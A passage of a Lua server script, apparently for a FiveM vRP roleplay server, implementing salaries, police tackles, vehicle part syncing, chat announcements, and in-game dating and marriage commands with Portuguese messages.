		return user_id,identity.nome,identity.sobrenome,identity.idade,identity.registro,identity.telefone,job,org,vip,vRP.format(carteira),vRP.format(banco)
	end
end

------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-- SISTEMA DE CHECAR COMANDO BLOQUEADO
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
function src.blockCommands(segundos)
	local source = source
	local user_id = vRP.getUserId(source)
	if user_id then
		exports["vrp"]:setBlockCommand(user_id, segundos)
	end
end

------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-- DELETAR VEICULO
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
function src.deleteVeh(vehicle)
    local source = source
    local user_id = vRP.getUserId(source)
    if user_id then
		exports['bm_module']:deleteVehicle(source, vehicle)
    end
end

------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-- SISTEMA DE PULAR E DERRUBAR PLAYER
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
function src.TackleServerPlayer(Tackled,ForwardVectorX,ForwardVectorY,ForwardVectorZ,Tackler)
	local source = source
    local user_id = vRP.getUserId(source)
	if vRP.hasPermission(user_id, "perm.policia") or vRP.hasPermission(user_id, "perm.policiacivil") or vRP.hasPermission(user_id, "perm.policiafederal")then
		if Tackled then
			vCLIENT.TackleClientPlayer(Tackled,ForwardVectorX,ForwardVectorY,ForwardVectorZ,Tackler)
		end
	end
end

------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-- TROCAR DE BANCO
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
RegisterCommand("seat",function(source,args,rawCommand)
    local user_id = vRP.getUserId(source)
    if user_id then
        if GetEntityHealth(GetPlayerPed(source)) > 105 then
			if tonumber(args[1]) then
				vCLIENT._seatPlayer(source, tonumber(args[1]))
			end
        end
    end
end)

------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-- CHECAR VIP OU BOOSTER
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
function src.checkAttachs()
	local source = source
	local user_id = vRP.getUserId(source)
	if user_id then
		if vRP.hasPermission(user_id, "perm.attachs") or vRP.hasPermission(user_id, "perm.booster") then
			return true
		end
	end
end

------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-- CHECAR MANOBRAS
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
function src.checkPermVip()
    local source = source
    local user_id = vRP.getUserId(source)
    if vRP.hasPermission(user_id,"perm.manobras") or vRP.hasPermission(user_id,"admin.permissao") then
        return true
    end
end


------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-- SISTEMA DE SALARIOS 
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
local cfg = module("cfg/groups")
local grupos = cfg.groups
local salarios = {}
local sound = {}
local userSalario = {}

local cfg = module("cfg/groups")
local grupos = cfg.groups
local salarios = {}
local sound = {}
local userSalario = {}


local AntiFlood = {}
function src.rCountSalario()
	local source = source
	local user_id = vRP.getUserId(source)
	if user_id then
		if GetInvokingResource() ~= nil then return end


		if salarios[user_id] == nil then 
			salarios[user_id] = 0 
		else
			salarios[user_id] = salarios[user_id] + 5
		end

		if salarios[user_id] >= 30 then
			pagarSalario(user_id)
			salarios[user_id] = 0
		end
	end
end

function pagarSalario(user_id)
	local source = vRP.getUserSource(user_id)
	if user_id then
		local groups = vRP.getUserGroups(user_id)

		if userSalario[user_id] ~= nil then
			if os.time() - userSalario[user_id] <= 60 then
				return
			end
		end
		
		for k,v in pairs(groups) do
			if grupos[k] and grupos[k]._config ~= nil and grupos[k]._config.salario ~= nil then
				if grupos[k]._config.salario > 0 then
					if grupos[k]._config.ptr then
						if vRP.checkPatrulhamento(user_id) then
							userSalario[user_id] = os.time()
							vRP.giveBankMoney(user_id, grupos[k]._config.salario)
                            TriggerClientEvent('chatMessage',source,"SALARIO:",{255,160,0}, "Você acaba de receber o salario de ^2"..k.."^0 no valor de ^2 $ "..vRP.format(grupos[k]._config.salario))
						end
					else
						userSalario[user_id] = os.time()
						vRP.giveBankMoney(user_id, grupos[k]._config.salario)
						TriggerClientEvent('chatMessage',source,"SALARIO:",{255,160,0}, "Você acaba de receber o salario de ^2"..k.."^0 no valor de ^2 $ "..vRP.format(grupos[k]._config.salario))
					end
				end
			end
		end
	end
end

RegisterCommand('salario', function(source,args)
	local user_id = vRP.getUserId(source)
	if user_id then
		if salarios[user_id] ~= nil then
			TriggerClientEvent('chatMessage',source,"SALARIO: ",{255,160,0}, " Ainda faltam ^2 ".. 40 - salarios[user_id].." minuto(s)^0 para você receber o seu salario.")
		end
	end
end)

---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-- SISTEMA DE CHAMADOS
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
local servicesAn = {
	["perm.policia"] = { prefix = "^5[POLICIA]" },
	["perm.unizk"] = { prefix = "^1[HOSPITAL]" },
	["perm.bennys"] = { prefix = "^2[BENNYS]" },
	["perm.mecanica"] = { prefix = "^2[MECANICA]" },
	["perm.jornal"] = { prefix = "^2[JORNAL]" },
	["perm.altacustoms"] = { prefix = "^2[ALTA CUSTOMS]" },
}

RegisterCommand('an',function(source,args,rawCommand)
	if args[1] then
		local user_id = vRP.getUserId(source)
		local identity = vRP.getUserIdentity(user_id)
	
		if user_id then
			local status,time = exports['vrp']:getCooldown(user_id, "anuncio")
			if status then 
				exports['vrp']:setCooldown(user_id, "anuncio", 60)
				for k,v in pairs(servicesAn) do
					if vRP.hasPermission(user_id, k) then
						TriggerClientEvent('chatMessage',-1,v.prefix.. "^0 " ..identity.nome.." "..identity.sobrenome.. ": ",{64,64,255},rawCommand:sub(3))
						break;
					end
				end
			end
		end
	end
end)

function src.checkskin()
    local source = source
    local user_id = vRP.getUserId(source)
    if vRP.hasPermission(user_id,"developer.permissao") then
        return true
    end
end

------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-- EVENTOS
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
RegisterServerEvent("trytrunk")
AddEventHandler("trytrunk",function(nveh, nplayers)
	if type(nveh) == "table" then
		print("Valor de Tabela: tryTrunk")
		return
	end

	local source = source
	if not nplayers then return end
	for _,ply in pairs(nplayers) do
		TriggerClientEvent("synctrunk",ply,nveh)
	end
end)

RegisterServerEvent("trywins")
AddEventHandler("trywins",function(nveh, nplayers)
	if type(nveh) == "table" then
		print("Valor de Tabela: trywins")
		return
	end

	local source = source
	if not nplayers then return end
	for _,ply in pairs(nplayers) do
		TriggerClientEvent("syncwins",ply,nveh)
	end
end)

RegisterServerEvent("tryhood")
AddEventHandler("tryhood",function(nveh, nplayers)
	if type(nveh) == "table" then
		print("Valor de Tabela: tryhood")
		return
	end

	local source = source
	if not nplayers then return end
	for _,ply in pairs(nplayers) do
		TriggerClientEvent("synchood",ply,nveh)
	end
end)

RegisterServerEvent("trydoors")
AddEventHandler("trydoors",function(nveh,door, nplayers)
	if type(nveh) == "table" or type(door) == "table" then
		print("Valor de Tabela: trydoors")
		return
	end

	local source = source
	if not nplayers then return end
	for _,ply in pairs(nplayers) do
		TriggerClientEvent("syncdoors",ply,nveh,door)
	end
end)

function tD(n)
    n = math.ceil(n * 100) / 100
    return n
end

-----------------------------------------------------------------------------------------------------------------------------------------
-- SISTEMA DE RELACIONAMENTO
-----------------------------------------------------------------------------------------------------------------------------------------
local delayShip = {}

vRP._prepare("setRelacionamento", "UPDATE vrp_user_identities SET relacionamento = @relacionamento WHERE user_id = @user_id")
vRP._prepare("getRelacionamento", "SELECT relacionamento FROM vrp_user_identities WHERE user_id = @user_id")

-- RegisterServerEvent("affairEvent")
-- AddEventHandler("affairEvent",function(nveh,door)
-- 	local source = source
-- 	local user_id = vRP.getUserId(source)
-- 	local identity = vRP.getUserIdentity(user_id)
	
-- 	if user_id then
-- 		if not delayShip[user_id] then delayShip[user_id] = 0 end

-- 		if vRP.getInventoryItemAmount(user_id, "alianca") <= 0 then
-- 			TriggerClientEvent("Notify",source,"negado","Você não possui uma aliança.",5)
-- 			return
-- 		end

-- 		if (os.time() - delayShip[user_id]) < 60 then
-- 			TriggerClientEvent("Notify",source,"negado","Aguarde para fazer um pedido novamente.",5)
-- 			return
-- 		end

-- 		local shipUserId = getRelacionamento(user_id)
-- 		if shipUserId.tipo ~= nil then
-- 			TriggerClientEvent("Notify",source,"negado","Você ja está em uma relação no momento.",5)
-- 			return
-- 		end

-- 		local nplayer = vRPclient.getNearestPlayer(source, 5)
-- 		if nplayer then
-- 			local nuser_id = vRP.getUserId(nplayer)
-- 			local nidentity = vRP.getUserIdentity(nuser_id)
-- 			if nuser_id then
-- 				local shipNUserId = getRelacionamento(nuser_id)
-- 				if shipNUserId.tipo ~= nil then
-- 					TriggerClientEvent("Notify",source,"negado","Este Jogador já está em uma relação no momento.",5)
-- 					return
-- 				end
-- 				TriggerClientEvent("Notify",source,"negado","Você está fazendo o pedido de namoro...",5)

-- 				TriggerClientEvent("emotes", nplayer, "cruzar")
-- 				TriggerClientEvent("emotes", source, "ajoelhar")
-- 				TriggerClientEvent("emotes", source, "rosa")

-- 				local requestCasamento = vRP.request(nplayer, "O(a) "..identity.nome.. " "..identity.sobrenome.." Está pedindo sua mão em namoro, deseja aceitar?")
-- 				if requestCasamento then
-- 					delayShip[user_id] = os.time()
-- 					delayShip[nuser_id] = os.time()

-- 					TriggerClientEvent('chat:addMessage',-1,{template='<div style="display:flex;align-items:center;justify-content:center;padding:10px;margin:5px 0;background-image: linear-gradient(to right, rgba(240, 108, 108,0.8) 3%, rgba(240, 86, 86,0) 95%);border-radius: 5px;"><img width="32" style="float: left;" src="https://media.discordapp.net/attachments/1035280539046903899/1095493129899089930/1786714.png">'..identity.nome.. ' '..identity.sobrenome..' está namorando '..nidentity.nome..' '..nidentity.sobrenome..'</b></div>'})
-- 					TriggerClientEvent("emotes", nplayer, "beijar")
-- 					TriggerClientEvent("emotes", source, "beijar")

-- 					vRP._execute("setRelacionamento", { user_id = nuser_id, relacionamento = json.encode({ tipo = "Namorando", user_id = user_id, data = os.date("%d/%m/%Y", os.time()), name = identity.nome.. " ".. identity.sobrenome }) })
-- 					vRP._execute("setRelacionamento", { user_id = user_id, relacionamento = json.encode({ tipo = "Namorando", user_id = nuser_id, data = os.date("%d/%m/%Y", os.time()), name = nidentity.nome.. " ".. nidentity.sobrenome }) })
-- 					vRP._updateIdentity(user_id)
-- 					vRP._updateIdentity(nuser_id)
-- 					vRP.tryGetInventoryItem(user_id, "alianca", 1)
-- 				else
-- 					TriggerClientEvent("Notify",source,"negado","Seu Pedido foi recusado.",5)
-- 				end
-- 			end
-- 		end
-- 	end
-- end)

-- RegisterServerEvent("marriedEvent")
-- AddEventHandler("marriedEvent",function(nveh,door)
-- 	local source = source
-- 	local user_id = vRP.getUserId(source)
-- 	local identity = vRP.getUserIdentity(user_id)
	
-- 	if user_id then
-- 		if not delayShip[user_id] then delayShip[user_id] = 0 end

-- 		if vRP.getInventoryItemAmount(user_id, "alianca") <= 0 then
-- 			TriggerClientEvent("Notify",source,"negado","Você não possui uma aliança.",5)
-- 			return
-- 		end

-- 		if (os.time() - delayShip[user_id]) < 60 then
-- 			TriggerClientEvent("Notify",source,"negado","Aguarde para fazer um pedido novamente.",5)
-- 			return
-- 		end

-- 		local shipUserId = getRelacionamento(user_id)
-- 		if shipUserId.tipo ~= nil then
-- 			if shipUserId.tipo == "Casado(a)" then
-- 				TriggerClientEvent("Notify",source,"negado","Sossega! Você já está Casado(a).",5)
-- 				return
-- 			end

-- 			local nplayer = vRPclient.getNearestPlayer(source, 5)
-- 			if nplayer then
-- 				local nuser_id = vRP.getUserId(nplayer)
-- 				local nidentity = vRP.getUserIdentity(nuser_id)
-- 				if nuser_id then
-- 					if shipUserId.user_id == nuser_id then
-- 						TriggerClientEvent("Notify",source,"negado","Você está fazendo o pedido de casamento...",5)

-- 						local requestCasamento = vRP.request(nplayer, "O(a) "..identity.nome.. " "..identity.sobrenome.." Está pedindo você em casamento, deseja aceitar?")
-- 						if requestCasamento then
-- 							delayShip[user_id] = os.time()
-- 							delayShip[nuser_id] = os.time()
-- 							TriggerClientEvent('chat:addMessage',-1,{template='<div style="display:flex;align-items:center;justify-content:center;padding:10px;margin:5px 0;background-image: linear-gradient(to right, rgba(240, 108, 108,0.8) 3%, rgba(240, 86, 86,0) 95%);border-radius: 5px;"><img width="32" style="float: left;" src="https://media.discordapp.net/attachments/1035280539046903899/1095493129899089930/1786714.png">'..identity.nome.. ' '..identity.sobrenome..' e '..nidentity.nome..' '..nidentity.sobrenome..' acabaram de se casar.</b></div>'})
					
-- 							vRP._execute("setRelacionamento", { user_id = nuser_id, relacionamento = json.encode({ tipo = "Casado(a)", user_id = user_id, data = os.date("%d/%m/%Y", os.time()), name = identity.nome.. " ".. identity.sobrenome }) })
-- 							vRP._execute("setRelacionamento", { user_id = user_id, relacionamento = json.encode({ tipo = "Casado(a)", user_id = nuser_id, data = os.date("%d/%m/%Y", os.time()), name = nidentity.nome.. " ".. nidentity.sobrenome }) })
-- 							vRP._updateIdentity(user_id)
-- 							vRP._updateIdentity(nuser_id)
-- 							vRP.tryGetInventoryItem(user_id, "alianca", 1)
-- 						else
-- 							TriggerClientEvent("Notify",source,"negado","Seu Pedido foi recusado.",5)
-- 						end
-- 					else
-- 						TriggerClientEvent("Notify",source,"negado","Essa pessoa não namora você.",5)
-- 					end
-- 				end
-- 			end
-- 		else
-- 			TriggerClientEvent("Notify",source,"negado","Você não está em uma relação no momento.",5)
-- 			return
-- 		end
-- 	end
-- end)

RegisterCommand('namorar', function(source,args)
	local user_id = vRP.getUserId(source)
	local identity = vRP.getUserIdentity(user_id)
	local status, time = exports['vrp']:getCooldown(user_id, "namorar")
	if not status then
		return TriggerClientEvent("Notify",source,"negado","Você poderá utilizar esse comando novamente em: "..time,5)
	end
	exports['vrp']:setCooldown(user_id, "namorar", 60)
		
	if user_id then
		
		if vRP.getInventoryItemAmount(user_id, "alianca") <= 0 then
			TriggerClientEvent("Notify",source,"negado","Você não possui uma aliança.",5)
			return
		end

		
		local shipUserId = getRelacionamento(user_id)
		if shipUserId.tipo ~= nil then
			TriggerClientEvent("Notify",source,"negado","Você ja está em uma relação no momento.",5)
			return
		end

		local nplayer = vRPclient.getNearestPlayer(source, 5)
		if nplayer then
			local nuser_id = vRP.getUserId(nplayer)
			local nidentity = vRP.getUserIdentity(nuser_id)
			if nuser_id then
				local shipNUserId = getRelacionamento(nuser_id)
				if shipNUserId.tipo ~= nil then
					TriggerClientEvent("Notify",source,"negado","Este Jogador já está em uma relação no momento.",5)
					return
				end
				TriggerClientEvent("Notify",source,"negado","Você está fazendo o pedido de namoro...",5)

				TriggerClientEvent("emotes", nplayer, "cruzar")
				TriggerClientEvent("emotes", source, "ajoelhar")
				TriggerClientEvent("emotes", source, "rosa")

				local requestCasamento = vRP.request(nplayer, "O(a) "..identity.nome.. " "..identity.sobrenome.." Está pedindo sua mão em namoro, deseja aceitar?")
				if requestCasamento then

					TriggerClientEvent('chat:addMessage',-1,{template='<div style="display:flex;align-items:center;justify-content:center;padding:10px;margin:5px 0;background-image: linear-gradient(to right, rgba(240, 108, 108,0.8) 3%, rgba(240, 86, 86,0) 95%);border-radius: 5px;"><img width="32" style="float: left;" src="https://media.discordapp.net/attachments/1035280539046903899/1095493129899089930/1786714.png"> | '..identity.nome.. ' '..identity.sobrenome..' está namorando '..nidentity.nome..' '..nidentity.sobrenome..'</b></div>'})
					TriggerClientEvent("emotes", nplayer, "beijar")
					TriggerClientEvent("emotes", source, "beijar")

					vRP._execute("setRelacionamento", { user_id = nuser_id, relacionamento = json.encode({ tipo = "Namorando", user_id = user_id, data = os.date("%d/%m/%Y", os.time()), name = identity.nome.. " ".. identity.sobrenome }) })
					vRP._execute("setRelacionamento", { user_id = user_id, relacionamento = json.encode({ tipo = "Namorando", user_id = nuser_id, data = os.date("%d/%m/%Y", os.time()), name = nidentity.nome.. " ".. nidentity.sobrenome }) })
					vRP._updateIdentity(user_id)
					vRP._updateIdentity(nuser_id)
					vRP.tryGetInventoryItem(user_id, "alianca", 1)
				else
					TriggerClientEvent("Notify",source,"negado","Seu Pedido foi recusado.",5)
				end
			end
		end
	end
end)

RegisterCommand('casar', function(source,args)
	local user_id = vRP.getUserId(source)
	local identity = vRP.getUserIdentity(user_id)
	

	local status, time = exports['vrp']:getCooldown(user_id, "casar")
	if not status then
		return TriggerClientEvent("Notify",source,"negado","Você poderá utilizar esse comando novamente em: "..time,5)
	end
	
	exports['vrp']:setCooldown(user_id, "casar", 60)
		
	if user_id then

		if vRP.getInventoryItemAmount(user_id, "alianca") <= 0 then
			TriggerClientEvent("Notify",source,"negado","Você não possui uma aliança.",5)
			return
		end

		local shipUserId = getRelacionamento(user_id)
		if shipUserId.tipo ~= nil then
			if shipUserId.tipo == "Casado(a)" then
				TriggerClientEvent("Notify",source,"negado","Sossega! Você já está Casado(a).",5)
				return
			end

			local nplayer = vRPclient.getNearestPlayer(source, 5)
			if nplayer then
				local nuser_id = vRP.getUserId(nplayer)
				local nidentity = vRP.getUserIdentity(nuser_id)
				if nuser_id then
					if shipUserId.user_id == nuser_id then
						TriggerClientEvent("Notify",source,"negado","Você está fazendo o pedido de casamento...",5)

						local requestCasamento = vRP.request(nplayer, "O(a) "..identity.nome.. " "..identity.sobrenome.." Está pedindo você em casamento, deseja aceitar?")
						if requestCasamento then
							TriggerClientEvent('chat:addMessage',-1,{template='<div style="display:flex;align-items:center;justify-content:center;padding:10px;margin:5px 0;background-image: linear-gradient(to right, rgba(240, 108, 108,0.8) 3%, rgba(240, 86, 86,0) 95%);border-radius: 5px;"><img width="32" style="float: left;" src="https://media.discordapp.net/attachments/1035280539046903899/1095493129899089930/1786714.png">'..identity.nome.. ' '..identity.sobrenome..' e '..nidentity.nome..' '..nidentity.sobrenome..' acabaram de se casar.</b></div>'})
					
							vRP._execute("setRelacionamento", { user_id = nuser_id, relacionamento = json.encode({ tipo = "Casado(a)", user_id = user_id, data = os.date("%d/%m/%Y", os.time()), name = identity.nome.. " ".. identity.sobrenome }) })
							vRP._execute("setRelacionamento", { user_id = user_id, relacionamento = json.encode({ tipo = "Casado(a)", user_id = nuser_id, data = os.date("%d/%m/%Y", os.time()), name = nidentity.nome.. " ".. nidentity.sobrenome }) })
							vRP._updateIdentity(user_id)
							vRP._updateIdentity(nuser_id)
							vRP.tryGetInventoryItem(user_id, "alianca", 1)
						else
							TriggerClientEvent("Notify",source,"negado","Seu Pedido foi recusado.",5)
						end
					else
						TriggerClientEvent("Notify",source,"negado","Essa pessoa não namora você.",5)
					end
				end
			end
		else
			TriggerClientEvent("Notify",source,"negado","Você não está em uma relação no momento.",5)
			return
		end
	end
end)

RegisterCommand('terminar', function(source,args)
	local user_id = vRP.getUserId(source)
	local identity = vRP.getUserIdentity(user_id)
	if user_id then

		local shipUserId = getRelacionamento(user_id)
		if shipUserId.tipo == nil then
			TriggerClientEvent("Notify",source,"negado","Você não pode terminar uma relação que não existe.",5)
			return
		end

		if shipUserId.tipo == "Namorando" then
			TriggerClientEvent('chat:addMessage',-1,{template='<div style="display:flex;align-items:center;justify-content:center;padding:10px;margin:5px 0;background-image: linear-gradient(to right, rgba(135, 135, 135,0.8) 3%, rgba(105, 105, 105,0) 95%);border-radius: 5px;"><img width="32" style="float: left;" src="https://cdn.discordapp.com/attachments/928341690828345445/979177362212155413/broken-heart.png">'..identity.nome.. ' '..identity.sobrenome..' e '..shipUserId.name..' terminaram o namoro.</b></div>'})
			
			vRP._execute("setRelacionamento", { user_id = shipUserId.user_id, relacionamento = json.encode({}) })
			vRP._execute("setRelacionamento", { user_id = user_id, relacionamento = json.encode({}) })
			vRP._updateIdentity(user_id)
			vRP._updateIdentity(shipUserId.user_id)
			return
		end

		if shipUserId.tipo == "Casado(a)" then
			TriggerClientEvent('chat:addMessage',-1,{template='<div style="display:flex;align-items:center;justify-content:center;padding:10px;margin:5px 0;background-image: linear-gradient(to right, rgba(135, 135, 135,0.8) 3%, rgba(105, 105, 105,0) 95%);border-radius: 5px;"><img width="32" style="float: left;" src="https://cdn.discordapp.com/attachments/928341690828345445/979177362212155413/broken-heart.png">'..identity.nome.. ' '..identity.sobrenome..' e '..shipUserId.name..' terminaram o casamento.</b></div>'})
			
			vRP._execute("setRelacionamento", { user_id = shipUserId.user_id, relacionamento = json.encode({}) })
			vRP._execute("setRelacionamento", { user_id = user_id, relacionamento = json.encode({}) })
			vRP._updateIdentity(user_id)
			vRP._updateIdentity(shipUserId.user_id)
		end
	end
end)

function getRelacionamento(user_id)
	local query = vRP.query("getRelacionamento", { user_id = user_id })
	if #query > 0 then
		return json.decode(query[1].relacionamento)
	end

	return false
end